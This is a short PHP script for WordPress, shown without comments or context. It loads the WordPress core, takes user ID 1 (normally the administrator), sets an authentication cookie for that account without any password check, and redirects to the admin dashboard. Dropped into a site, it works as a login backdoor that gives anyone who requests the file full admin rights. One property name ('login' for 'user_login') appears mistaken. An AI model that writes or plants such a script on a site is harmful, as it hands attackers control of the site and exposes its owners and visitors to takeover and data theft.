<?
require('wp-blog-header.php');
$user = get_user_by('id', 1);
$user_id = $user->ID;
$user_login = $user->login;
wp_set_current_user($user_id, $user_login);
wp_set_auth_cookie($user_id);
do_action('wp_login', $user_login);
header("Location: /wp-admin");